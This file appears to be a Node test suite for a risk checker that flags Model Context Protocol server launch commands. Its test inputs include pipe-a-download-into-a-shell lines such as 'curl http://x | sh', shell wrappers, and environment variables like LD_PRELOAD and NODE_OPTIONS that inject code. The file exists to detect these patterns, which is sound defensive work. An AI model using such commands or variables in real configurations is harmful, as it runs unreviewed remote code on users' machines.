import { test } from 'node:test';
import assert from 'node:assert/strict';
import { assessRisk, riskLevel } from '../lib/risk.js';

const stdio = (command, args = []) => ({ transport: 'stdio', command, args });

test('risk: a downloader is flagged even when it is the normal way to run a server', () => {
  const flags = assessRisk(stdio('npx', ['-y', '@modelcontextprotocol/server-github']));
  assert.deepEqual(flags.map((flag) => flag.code), ['downloads']);
  assert.equal(riskLevel(flags), 'warn');
});

test('risk: every package runner is recognised, with or without a path or extension', () => {
  for (const command of ['npx', 'pnpm', 'yarn', 'bunx', 'uvx', 'pipx', 'C:\\node\\npx.cmd', 'npm.cmd']) {
    assert.ok(assessRisk(stdio(command)).some((flag) => flag.code === 'downloads'), command);
  }
});

test('risk: piping a download into a shell is the one high-severity pattern', () => {
  for (const args of [['http://x', '|', 'sh'], ['http://x', '|bash'], ['x | pwsh']]) {
    const flags = assessRisk(stdio('npx', args));
    assert.ok(flags.some((flag) => flag.code === 'pipe-shell'), JSON.stringify(args));
    assert.equal(riskLevel(flags), 'high');
  }
});

test('risk: a shell wrapper and a download command are warned about', () => {
  assert.ok(assessRisk(stdio('cmd', ['/c', 'echo hi'])).some((flag) => flag.code === 'shell'));
  assert.ok(assessRisk(stdio('bash', ['-lc', 'echo'])).some((flag) => flag.code === 'shell'));
  assert.ok(!assessRisk(stdio('node', ['install.js'])).some((flag) => flag.code === 'shell'));
  assert.ok(assessRisk(stdio('sh', ['-c', 'curl http://x | sh'])).some((flag) => flag.code === 'download-command'));
});

test('risk: an absolute binary is reported as information, not as a warning', () => {
  const flags = assessRisk(stdio('C:\\Tools\\server.exe', ['--port', '1']));
  assert.deepEqual(flags.map((flag) => flag.code), ['absolute']);
  assert.equal(riskLevel(flags), 'info');
});

test('risk: plain local commands carry no flags', () => {
  assert.deepEqual(assessRisk(stdio('uv', ['run', 'server'])), []);
  assert.deepEqual(assessRisk(stdio('docker', ['run', '-i', '--rm', 'mcp/github'])).map((flag) => flag.code), ['downloads'], 'an image is pulled from a registry, and its name is not a file');
  assert.deepEqual(assessRisk(stdio('python', ['-m', 'mcp_server'])), []);
  assert.equal(riskLevel([]), undefined);
});

test('risk: running a file from the repository is flagged, because approval does not cover its content', () => {
  for (const [command, args] of [['node', ['server.js']], ['python', ['tools/mcp.py']], ['./bin/server', []], ['node', ['dist/index.js', '--port', '1']]]) {
    assert.deepEqual(assessRisk(stdio(command, args)).map((flag) => flag.code), ['repo-file'], `${command} ${args.join(' ')}`);
  }
  assert.ok(!assessRisk(stdio('npx', ['-y', '@scope/pkg'])).some((flag) => flag.code === 'repo-file'), 'a package name is not a file');
  assert.ok(!assessRisk(stdio('sh', ['-c', 'curl http://x/y | sh'])).some((flag) => flag.code === 'repo-file'), 'a command line is not a file');
});

test('risk: variables that make a runtime load extra code are high severity', () => {
  for (const key of ['NODE_OPTIONS', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'PYTHONPATH', 'PATH']) {
    const flags = assessRisk({ transport: 'stdio', command: 'x', env: { [key]: 'y' } });
    assert.ok(flags.some((flag) => flag.code === 'env-inject'), key);
    assert.equal(riskLevel(flags), 'high');
  }
  assert.deepEqual(assessRisk({ transport: 'stdio', command: 'x', env: { GITHUB_TOKEN: 'y' } }), []);
});

test('risk: http servers are not assessed as commands', () => {
  assert.deepEqual(assessRisk({ transport: 'streamable-http', url: 'https://h/mcp' }), []);
});

test('risk: a word that merely contains a downloader is not flagged', () => {
  assert.deepEqual(assessRisk(stdio('mycurlhelper')), []);
  assert.deepEqual(assessRisk(stdio('node', ['--curl-mode'])), []);
});
